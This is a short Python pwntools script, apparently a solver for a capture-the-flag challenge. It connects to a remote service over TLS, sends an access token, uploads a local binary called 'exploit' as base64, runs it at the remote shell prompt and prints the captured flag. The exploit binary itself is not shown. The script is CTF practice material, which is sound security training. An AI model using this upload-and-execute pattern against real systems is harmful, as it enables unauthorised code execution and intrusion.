#!/usr/bin/env python3

from pwn import *
import base64
import sys

url = sys.argv[1].split(":")
io = remote(url[0], int(url[1]), ssl=True)

io.sendline(b"BABELOFENTDEALER")

with open("exploit", "rb") as f:
    data = f.read()

data = base64.b64encode(data)
io.sendlineafter(b"exploit: ", data)

for i in range(3):
    io.sendlineafter(b"~ $ ", b"/exploit")

io.recvuntil(b"TRX{")
io.recvuntil(b"TRX{")
print("TRX{" + io.recvuntil(b"}").decode())

io.close()
